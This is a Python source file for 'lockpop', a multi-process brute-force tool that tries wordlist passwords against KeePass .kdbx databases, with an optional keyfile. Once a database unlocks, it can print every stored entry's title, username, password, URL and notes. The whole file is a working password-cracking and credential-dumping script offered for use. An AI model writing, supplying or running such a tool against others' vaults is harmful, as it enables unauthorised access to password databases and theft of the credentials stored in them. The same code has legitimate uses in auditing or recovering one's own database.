import argparse
from pykeepass import PyKeePass
from multiprocessing import Pool
import time
import os

def try_password(args):
    index, password, database_path, keyfile_path = args
    password = password.strip()
    try:
        PyKeePass(database_path, password=password, keyfile=keyfile_path)
        return password
    except Exception:
        return None

def main():
    parser = argparse.ArgumentParser(
        description="lockpop: a simple multi-process brute-force tool for KeePass (.kdbx) files. Works with password-only or password+keyfile setups."
    )
    parser.add_argument(
        "-d", "--database", type=ascii, required=True,
        help="Path to the KeePass .kdbx file"
    )
    parser.add_argument(
        "-w", "--wordlist", type=ascii, required=True,
        help="Text file with passwords to try, one per line"
    )
    parser.add_argument(
        "-k", "--keyfile", type=ascii, required=False,
        help="Optional keyfile to use if the database requires it"
    )
    parser.add_argument(
        "-o", "--output", action="store_true",
        help="If the database is unlocked, show all stored entries"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=os.cpu_count(),
        help="Number of parallel processes to use (default: all CPU cores)"
    )
    args = parser.parse_args()

    db_file = args.database.replace("'", "")
    wordlist_file = args.wordlist.replace("'", "")
    keyfile_path = args.keyfile.replace("'", "") if args.keyfile else None
    output_entries = args.output
    num_threads = args.threads

    print("Starting lockpop...")
    print(f"Database file : {db_file}")
    print(f"Wordlist      : {wordlist_file}")
    if keyfile_path:
        print(f"Keyfile       : {keyfile_path}")

    max_threads = os.cpu_count()
    if num_threads < 1:
        print("Thread count too low. Using 1 thread instead.")
        num_threads = 1
    elif num_threads > max_threads:
        print(f"Too many threads. Max allowed is {max_threads}. Adjusting accordingly.")
        num_threads = max_threads

    print(f"Threads used  : {num_threads}\n")

    try:
        with open(wordlist_file, "r", encoding="unicode_escape") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"Wordlist not found: {wordlist_file}")
        return

    task_args = [(i, pw, db_file, keyfile_path) for i, pw in enumerate(passwords)]

    found_password = None
    tried = 0
    start_time = time.time()

    with Pool(processes=num_threads) as pool:
        for result in pool.imap_unordered(try_password, task_args):
            tried += 1
            if result:
                found_password = result
                pool.terminate()
                break

    end_time = time.time()
    duration = end_time - start_time

    print("\nBrute-force finished.")
    print(f"Passwords tried : {tried}")
    print(f"Time taken      : {duration:.2f} seconds\n")

    if found_password:
        print(f"Password found: {found_password}")
        if output_entries:
            try:
                kp = PyKeePass(db_file, password=found_password, keyfile=keyfile_path)
                print("\nDatabase entries:")
                print("-" * 30)
                for entry in kp.entries:
                    print(f"Title    : {entry.title}")
                    print(f"Username : {entry.username}")
                    print(f"Password : {entry.password}")
                    print(f"URL      : {entry.url}")
                    print(f"Notes    : {entry.notes}")
                    print("-" * 30)
            except Exception as e:
                print(f"Error reading entries: {e}")
    else:
        print("No valid password found.")

if __name__ == "__main__":
    main()
